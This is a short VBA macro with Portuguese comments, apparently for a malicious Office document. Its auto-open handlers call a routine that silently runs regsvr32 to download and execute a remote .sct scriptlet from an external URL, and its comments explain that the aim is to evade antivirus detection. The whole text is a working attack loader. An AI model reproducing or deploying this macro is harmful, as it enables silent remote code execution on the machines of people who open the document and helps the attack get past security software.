' Tentando dar bypass na verificação do AV, pra que ele não veja que estamos tentando baixar externamente o .sct 

Private Sub Document_Open()
Test
End Sub

Private Sub DocumentOpen()
Test
End Sub

Private Sub Auto_Open()
Test
End Sub

Private Sub AutoOpen()
Test
End Sub

Private Sub Auto_Exec()
Test
End Sub

Private Sub Test()
    Dim shell
    Dim out
    Set shell = VBA.CreateObject("WScript.Shell")
    out = shell.Run("regsvr32 /u /n /s /i:https://igorfavin.github.io/website/user.sct scrobj.dll", 0, False) ' Chamando o registrador de dll para tentar executar um scriptlet externo que contém um manifesto que vai fazer o registro de uma nova atividade direto na memória. Desregistrando o scrobj.dll que é a dll script run time do windows, conseguimos executar um script durante o processo. As duas últimas options é 0 pra não mostrar nenhuma janela durante a execução. E False pro VBA continuar executando o código.
End Sub
